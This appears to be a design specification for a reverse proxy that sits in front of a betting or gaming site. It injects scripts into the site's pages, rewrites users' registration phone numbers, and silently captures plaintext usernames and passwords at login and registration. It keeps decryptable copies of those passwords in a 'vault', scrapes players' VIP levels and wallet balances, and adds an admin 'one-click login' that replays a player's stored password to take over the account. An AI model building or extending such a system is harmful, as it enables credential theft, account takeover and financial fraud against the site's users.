Feature 1 — register with mobile+7
injectRegisterSuffixShim() (injected inside injectCombinedShims(), so ordering/regex count stay the same):

On register pages only, detect the mobile input (name="mobileNum" / mobileNum1 / mobileNum2, confirmed in m/app.*.js), and if the value matches ^01[3-9]\d{8}$, rewrite it to <value>7 on blur/change/submit-button click, using the native value setter + a dispatched input event so React's state picks it up (the app reads e.target.value). Strip a doubled trailing 7 (idempotent).
If the username field is auto-filled from the mobile, mirror the suffixed value there too.
Merge the suffixed mobile into reg_info (keeps the existing referral shim intact).
Show a small inline hint: “Login ID will be <mobile>7”.
Runs on both desktop (res/js/app.*.js) and mobile bundles.
applyRegisterRules(): for /wps/system/setting/register, set mobileNum.acceptedPattern to accept 11 or 12 digits and minLength=11, maxLength=12. REG_MOBILE_PATTERN default handling updated accordingly. The login flow uses the same suffixed ID.

Note: login/register bodies are never rewritten server-side (they are ciphertext). The suffix therefore ships via the shim, and the validation config is widened so the 12-digit value passes the app's own client validator.

Feature 2 — credential capture, hashed at rest
Proxy/api/players-collect.php (POST, same-origin):

Shim, at XMLHttpRequest.send/fetch time for URLs matching /wps/session/login, /wps/member/register, reads the current DOM values (username/mobileNum + password) and POSTs {username, mobile_raw, mobile_suffixed, password, source} to /api/players-collect.php (base-prefixed).
Endpoint guards: Sec-Fetch-Site: same-origin + a server-signed day-scoped HMAC nonce embedded in the shim (capture_secret), IP rate-limit (e.g. 30/min), mobile/username format validation.
password_hash($pw, PASSWORD_DEFAULT) → pass_hash; AES-256-GCM vault copy → vault. Never logs plaintext; never accepts vip/balance from the client.
players_upsert() dedupes by username (case-insensitive); defaults vip="VIP0", balance=0, source, created_at, last_ip, user_agent.
store.php helpers: players_load(), players_save(), players_upsert(), players_update(callable) (flock on players.json.lock for atomic read-modify-write; store_write() tmp+rename for the write), vault_encrypt()/vault_decrypt(), vault_key(), token + audit helpers.

Server-side response capture (in Proxy/index.php, after [$body,$ct,$status,$respHeaders]=$res;, JSON + 2xx only): parse data.value for /wps/session/login, /wps/member/register* (username/mobile/last_login), /wps/member/info (VIP: clubLabel.labelName + rankLevel), /wps/wallets/gcs (balance; resilient key probe with live-verification fallback). Upsert per username. Never alter the forwarded body.

Caching: extend isAuthTraffic() with /wps/member/register, /wps/session/key/rsa, /wps/member/info, /wps/wallets/gcs, /player-login, /api/players-collect so all stay private, no-store.

Feature 4 — one-click login
Admin POST (CSRF, admin-only, 10/min) → mint single-use token {token:random_bytes(32)→hex, username, expires:+60s, used:false, created_by, ip} into player_login_tokens.json; audit to admin_audit.json.
Redirect admin browser to /player-login?token=… — routed in Proxy/index.php and Proxy/router.php, isAuthTraffic=true, Cache-Control: no-store, admin session required.
Handler burns the token (single-use + expiry, under flock), decrypts vault in memory only, fetches /m/login from upstream via fetchFromUpstream(), and injects a shim that pre-fills the genuine username/password inputs (native setter + input/change events), submits, and lets the app's own crypto log in → redirects to /m/home; shows an error on failure and clears the credentials. Password never in the URL, never displayed, never logged.
Fallback: Copy login ID button.
